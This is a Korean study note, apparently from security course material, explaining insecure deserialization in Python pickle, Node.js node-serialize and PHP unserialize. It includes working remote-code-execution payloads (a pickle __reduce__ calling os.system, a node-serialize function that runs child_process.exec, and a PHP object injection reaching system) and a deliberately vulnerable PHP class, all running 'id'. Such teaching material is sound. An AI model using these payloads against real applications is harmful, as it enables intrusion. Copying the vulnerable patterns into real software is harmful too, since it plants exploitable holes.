Serialize / Deserialize (직렬화 / 역직렬화) :
    Serialize - Object 또는 Data의 상태 또는 타입을 특정한 형태의 포맷을 가진 데이터로 변환하는 것을 의미
    
    Deserialize - 직렬화된 데이터를 원래의 Object 또는 Data의 상태 또는 타입으로 변환하는 것을 의미

        Object, Data의 현재 상태와 타입들을 저장,
        원하는 상황에 역직렬화를 통해 동일한 상태와 타입을 가진 오브젝트 또는 데이터들을 사용 가능

        공격자는 역직렬화 과정에서 어플리케이션 상에서 다른 행위를 발생시키는 상태 또는 타입을 이용해 악의적인 행위 발생, 특정 상황에 호출되는 메소드들을 이용해 공격에 사용

        ex)
            import pickle
            class TestClass:
            def __init__(self, a, b):
                self.A = a
                self.B = b
            # TestClass 생성, ClassA로 할당
            ClassA = TestClass(31337,10001)
            # ClassA 직렬화
            ClassA_dump = pickle.dumps(ClassA)
            print(ClassA_dump)
            # ClassA 역직렬화, ClassB로 할당
            ClassB = pickle.loads(ClassA_dump)
            print(ClassB.A, ClassB.B)

            결과 :
                $ python3 pickleTest.py 
                b"\x80\x03cmain\nTestClass\nq\x00)\x81q\x01}q\x02(X\x01\x00\x00\x00Aq\x03MizX\x01\x00\x00\x00Bq\x04M\x11'ub."
                31337 10001

    Python (pickle, yaml 모듈) : 
        Python Object에서 __reduce__ 메소드 공격에 사용
        Python Deserialize 취약점 예시 코드

            import pickle
            import os
            class TestClass:
                def __reduce__(self):
                    return os.system, ("id", )
            ClassA = TestClass()
            # ClassA 직렬화
            ClassA_dump = pickle.dumps(ClassA)
            print(ClassA_dump)
            # 역직렬화
            pickle.loads(ClassA_dump)

            결과 :
                $ python3 pickleExploit.py
                b'\x80\x03cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'
                uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)

    Javascript(NodeJS) : node-serialize 모듈
        serialize :
            var serialize = require('node-serialize');
            x = {
                test : function(){ return 'Hello'; }
            };
            console.log(serialize.serialize(x));
            /*
            {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}
            */

        node-serialize 모듈의 직렬화된 포맷에서 _$$ND_FUNC$$_은 함수를 의미합니다.
        object를 직렬화 :
            serialize_func_1 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }"}
            console.log(serialize.unserialize(serialize_func_1));
            /*
            { test: [Function (anonymous)] }
            */
            serialize.unserialize(serialize_func_1)['test']()
            /*
            'Hello'
            */ 

        직렬화된 object 값을 역직렬화 시키면 원래 object 형태로 나옵니다.
        역직렬화 :
            serialize_func_2 = {"test":"_$$ND_FUNC$$_function(){ return 'Hello'; }()"}
            console.log(serialize.unserialize(serialize_func_2));
            /*
            { test: 'Hello' }
            */

        직렬화된 object의 결과에서 내부에 포함된 함수가 역직렬화 과정에서 실행되게 ()를 붙여 실행하면 역직렬화 과정에서 함수가 실행되어 결과가 반영되는것 을 확인할 수 있습니다.

        원격 코드 실행 페이로드 :
            var serialize = require('node-serialize');
            serialize_exploit_func = {"test":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
            console.log(serialize.unserialize(serialize_exploit_func));
            /*
            uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
            */

    PHP :
        Serialize:
            <?php
            class Test{
                var $var1 = "value1";
                var $var2 = 31337;
                var $var3 = True;
            }
            $obj = new Test();
            var_dump(serialize($obj));
            /*
            string(73) "O:4:"Test":3:{s:4:"var1";s:6:"value1";s:4:"var2";i:31337;s:4:"var3";b:1;}"
            */

        Serialize 된 데이터 포맷 :
            O:4:"Test": # <Type>:<Class name length>:<class name>:
            3:{ # <Number of properties>:{
                s:4:"var1"; # <Type>:<propertie name length>:<propertie name>;
                s:6:"value1"; # <Type>:<propertie value length>:<propertie value>;
                s:4:"var2";
                i:31337;
                s:4:"var3";
                b:1;
            }
            # <Type>
            # O: Object
            # s: String
            # i: int
            # b: Boolean 1=True, 0=False

        데이터 포맷 기반으로 serialize된 데이터 변조해 Object 데이터를 변조 가능 :
            <?php
            class Test{
                var $var1 = "value1";
                var $var2 = 31337;
                var $var3 = True;
            }
            $obj = new Test();
            var_dump($obj);
            /*
            object(Test)#1 (3) {
                ["var1"]=>
                string(6) "value1"
                ["var2"]=>
                int(31337)
                ["var3"]=>
                bool(true)
            }
            */
            $serialize_Data = 'O:4:"Test":3:{s:4:"var1";s:4:"test";s:4:"var2";i:77777;s:4:"var3";b:0;}';
            $obj = unserialize($serialize_Data);
            var_dump($obj);
            /*
            object(Test)#2 (3) {
                ["var1"]=>
                string(4) "test"
                ["var2"]=>
                int(77777)
                ["var3"]=>
                bool(false)
            }
            */
            ?>
        
        Deserialize 공격에서는 Object의 특수한 상황에서 실행되어지는 Magic Methods를 이용

        Magic Methods :
            __destruct() => 소멸자의 개념으로 오브젝트 소멸 시 호출됨.
            __wakeup() => 역직렬화 시 호출됨.

            예)
                <?php
                class Test{
                function __wakeup(){
                    echo "Call __wakeup.\n";
                }
                function __destruct(){
                    echo "Call __destruct.\n";
                }
                function __construct(){
                        echo "Call __construct.\n";
                }
                }
                echo "New Class.\n";
                $obj = new Test();
                echo "unserialize Class.\n";
                $serialize_Data = 'O:4:"Test":0:{}';
                $obj = unserialize($serialize_Data);
                /*
                New Class.
                Call __construct.
                unserialize Class.
                Call __wakeup.
                Call __destruct.
                Call __destruct.
                */

        Unserialize에 의해 호출되는 Magic Methods 로직의 취약점이 존재하거나, 클래스의 데이터를 조작해 공격 연계해야 됨

            클래스의 변수를 조작하여 연계가 가능한 취약한 코드와 공격 예시)

            <?php
            class Test{
                var $func_name = "var_dump";
                var $argv = "test";
                function __destruct(){
                    call_user_func($this->func_name, $this->argv);
                }
            }
            $obj = new Test();
            $serialize_Data = 'O:4:"Test":2:{s:9:"func_name";s:6:"system";s:4:"argv";s:2:"id";}';
            $obj = unserialize($serialize_Data);
            /*
            string(4) "test"
            uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
            */
        

